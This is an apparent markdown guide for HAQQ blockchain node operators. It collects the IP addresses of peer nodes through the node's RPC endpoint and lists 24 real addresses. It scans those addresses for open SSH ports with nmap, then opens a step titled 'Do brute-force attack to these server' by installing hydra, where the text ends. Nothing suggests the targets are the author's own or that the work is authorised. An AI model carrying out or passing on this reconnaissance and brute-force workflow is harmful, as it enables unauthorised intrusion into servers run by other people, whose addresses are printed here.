### 1. Get IP of current peers connected to our node
- Check RPC port of HAQQ node
```
haqqd status | jq ."NodeInfo"."other"."rpc_address"
```
Output will be:
> "tcp://0.0.0.0:30657"

- Collect IP of current peers to log file `Peer_IP.txt`
```
curl -sS http://localhost:30657/net_info | jq -r '.result.peers[] | "\(.node_info.id)@\(.remote_ip):\(.node_info.listen_addr)"' | awk '{FS=":|@"} {print $2}' | grep -e "^[1-9]" > Peer_IP.txt
```
Output will be as below:  
>```
> root@Hetz-HEL1-DC2-032:~# cat Peer_IP.txt
> 159.69.20.76
> 65.21.133.125
> 148.251.47.69
> 212.162.153.138
> 62.171.150.139
> 94.130.239.162
> 94.130.142.27
> 185.187.169.237
> 51.81.35.102
> 116.203.37.162
> 198.204.240.170
> 65.108.67.152
> 65.108.157.85
> 65.21.146.106
> 65.109.34.133
> 135.181.147.140
> 95.214.54.158
> 65.108.52.192
> 34.91.81.33
> 65.108.62.95
> 146.19.24.139
> 65.108.232.174
> 34.90.129.213
> 38.242.242.192
> ```

### 2. Check which SSH port is ON on these peers
- Install `nmap` on your server
```
sudo apt install nmap
```
- Check SSH port of peer IP 
```
for i in `cat Peer_IP.txt`; do echo "$i:`nmap $i|grep ssh`"; done
```
- Output log will be as below
> ![image](https://user-images.githubusercontent.com/91453629/194015036-c42d6d6e-f1ba-4e5f-8e22-ba88a992cd67.png)

### 3. Do brute-force attack to these server
- Install software `hydra` on your server
```
sudo apt install hydra
```
